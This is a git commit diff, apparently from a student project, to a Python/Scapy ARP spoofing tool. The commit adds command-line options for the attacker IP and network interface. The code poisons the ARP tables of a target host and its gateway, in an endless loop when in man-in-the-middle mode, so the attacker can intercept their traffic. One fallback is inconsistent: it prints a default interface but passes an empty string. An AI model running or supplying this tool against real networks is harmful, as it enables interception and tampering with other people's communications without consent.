94590ea6703b9cab0afac989c54b8e564eac23ee
JfmGijsbers <j.f.m.gijsbers@student.tue.nl>
2021-06-28 18:45:59 +0200

    Added the setting of attacker IP and interface

--- ARP.py
+++ ARP.py
@@ -1,20 +1,21 @@
 #!/usr/bin/env python
-from classes.User import User
 from classes.ARPPacket import ARPPacket
 from scapy.all import *
 
 class ARP:
-    def __init__(self, attacker, victim, gateway):
+    def __init__(self, attacker, victim, gateway, interface = "enp0s3"):
         self.attacker = attacker
         self.victim = victim
         self.gateway = gateway
+        self.interface = interface
 
 
     def spoof(self, mitm = False):
         victim_packet = ARPPacket(
             self.attacker,
             self.victim,
-            self.gateway
+            self.gateway,
+            self.interface
         )
         victim_packet.send()
         print("Poisoned victim's ARP table")
@@ -23,7 +24,8 @@ class ARP:
             gateway_packet = ARPPacket(
                 self.attacker,
                 self.gateway,
-                self.victim
+                self.victim,
+                self.interface
             )
             gateway_packet.send()
             print("Poisoned Gateway's ARP table")
--- main.py
+++ main.py
@@ -2,26 +2,39 @@ from ARP import ARP
 from classes.User import User
 import time
 import argparse
+import socket
 
 def get_args():
     parser = argparse.ArgumentParser()
     parser.add_argument("-t", "--target", dest = "target_ip", help = "IP Address of the target.")
     parser.add_argument("-g", "--gateway", dest = "gateway_ip", help = "IP Address of the Gateway.")
+    parser.add_argument("-ip", "--localip", dest = "local_ip", help = "IP Address of the Attacker.")
+    parser.add_argument("-i", "--interface", dest = "interface", help = "Interface.")
     options = parser.parse_args()
     if not options.target_ip:
         parser.error("[-] MISSING PARAMETER '-t' (target IP), use --help for more info.")
     elif not options.gateway_ip:
         parser.error("[-] MISSING PARAMETER '-g' (gateway IP), use --help for more info.")
+    if not options.interface:
+        options.interface = ""
+        print("Interface not defined, using default value of 'enp0s3'")
+    if not options.local_ip:
+        options.local_ip = 0
+        print("Attacker IP not defined, will calculate IP later")
     return options
 
-def ARPSpoof( victim_ip, gateway_ip, n_times = 0):
-    attacker = User('192.168.56.103')
+def ARPSpoof(victim_ip, gateway_ip, interface, attacker_ip, n_times = 0):
+    if attacker_ip == 0:
+        hostname = socket.gethostname()
+        attacker_ip = socket.gethostbyname(hostname)
+        print("Found local IP, using " + str(attacker_ip))
+    attacker = User(attacker_ip)
     attacker.get_mac()
     victim = User(victim_ip)
     victim.get_mac()
     gateway = User(gateway_ip)
     gateway.get_mac()
-    arp = ARP(attacker, victim, gateway)
+    arp = ARP(attacker, victim, gateway, interface)
     if n_times <= 0:
         while True:
             arp.spoof(mitm=True)
@@ -34,4 +47,11 @@ if __name__ == '__main__':
     options = get_args()
     target_ip = options.target_ip
     gateway_ip = options.gateway_ip
-    ARPSpoof(target_ip, gateway_ip)
+    interface = options.interface
+    attacker_ip = options.local_ip
+
+    ARPSpoof(target_ip,
+        gateway_ip,
+        interface,
+        attacker_ip
+    )
